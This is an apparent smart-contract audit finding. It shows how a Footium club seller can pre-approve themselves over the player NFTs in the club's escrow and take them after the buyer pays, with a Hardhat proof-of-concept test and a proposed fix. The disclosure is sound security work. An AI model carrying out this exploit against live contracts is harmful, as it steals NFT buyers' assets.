# Risk of the previous owner taking all the players from the new owner when a club is traded

## Summary

Because of how player NFTs are stored, it is highly feasible for the previous owner of a club to authorize themselves as the operator of these NFTs shortly before selling the club. They could then easily steal the NFTs from the escrow after the ownership of the club has been transferred.

## Vulnerability Detail

The issue at hand arises from the fact that clubs are represented as ERC721 tokens, which grants the token holder ownership and control over the associated escrow contract. However, the problem lies with the ownership of player NFTs. Unlike clubs, player NFTs are not directly owned by the user, but by the club escrow.

When an ERC721 token, such as a player NFT, is traded using the "transfer()" or "transferFrom()" functions, the approved operator is removed, and the NFT becomes the sole property of the new owner. However, because player NFTs and other assets related to the club are stored in the escrow, the ownership of these assets does not actually change during the transfer of the escrow ownership, and their operators do not get reset either. Instead, only the escrow's administrator changes.

This creates a vulnerability when clubs are sold on regular NFT marketplaces such as OpenSea or LooksRare. The previous club owner could easily authorize themselves as the operator of the player NFTs just before transferring ownership of the club. This allows them to steal the NFTs from the escrow once the transfer is complete.

Let's take a look at how this scenario could unfold:

Malicious Alice acquires a club with 20 player NFTs and enjoys playing with it for a while.

Malicious Alice lists her club NFT for sale on OpenSea, still containing all of the player NFTs in its associated escrow contract. Prior to the sale, she approves herself as the operator of the escrow contract's assets.

Innocent Bob comes across the listing and decides to purchase the club NFT for a certain amount of ETH.

Malicious Alice then proceeds to transfer all of the player NFTs and other assets held in the escrow contract to her own wallet, effectively stealing them.

As a result, Innocent Bob is left with only the club NFT, without any of the player NFTs that were originally associated with it.

## Impact

This leads to the new owner being scammed out of the players of the club NFT they have bought.

Here is a working Proof of Concept (PoC) using Hardhat:

```jsx
it("Should steal all players", async () => {
        const TOKEN_ID = 1;

        let maliciousAlice, innocentBob;

        [, , maliciousAlice, innocentBob] = await ethers.getSigners();

        //maliciousAlice gets minted a club, and the escrow contract with 20 player NFTs is created.
        await expect(clubMinter.mint(maliciousAlice.address, TOKEN_ID))
            .to.emit(clubs, "Transfer")
            .withArgs(ZERO_ADDRESS, maliciousAlice.address, TOKEN_ID);

        //here we get the escrow contract
        const escrowAddress = await clubs.clubToEscrow(TOKEN_ID);
        const escrow = await ethers.getContractAt(
            "FootiumEscrow",
            escrowAddress
        );

        //here before the sell maliciousAlice approved herself for all the players in the contract
        await escrow
            .connect(maliciousAlice)
            .setApprovalForERC721(
                players.address,
                maliciousAlice.address,
                true
            );

        //maliciousAlice sells the club to innocentBob
        await clubs
            .connect(maliciousAlice)
            .transferFrom(
                maliciousAlice.address,
                innocentBob.address,
                TOKEN_ID
            );

        const balanceBefore = await players.balanceOf(maliciousAlice.address);

        // 0 because she hasn't stolen them yet.
        expect(balanceBefore).to.be.eq(0);

        //maliciousAlice backruns the sell transaction and transfers all the players to herself.
        for (let i = 0; i < 20; i++) {
            await players
                .connect(maliciousAlice)
                .transferFrom(escrow.address, maliciousAlice.address, i);
        }

        const balanceAfter = await players.balanceOf(maliciousAlice.address);

        //20 from the first mint and 20 from the second mint
        expect(balanceAfter).to.be.eq(20);
    });
```

## Tool used

Manual Review, Hardhat

## Recommendation

We propose implementing a variation of the following solution:

One possible implementation is to keep a record of all authorized operators in a mapping stored within the escrow contract. This can be achieved by extending the functions "transfer()", "safeTransfer()", "transferFrom()", and "safeTransferFrom()" of the ClubNFT contract. These extended functions will call the escrow contract, which in turn will revoke all the authorized operators stored in the mapping before transferring the NFT to the new owner.
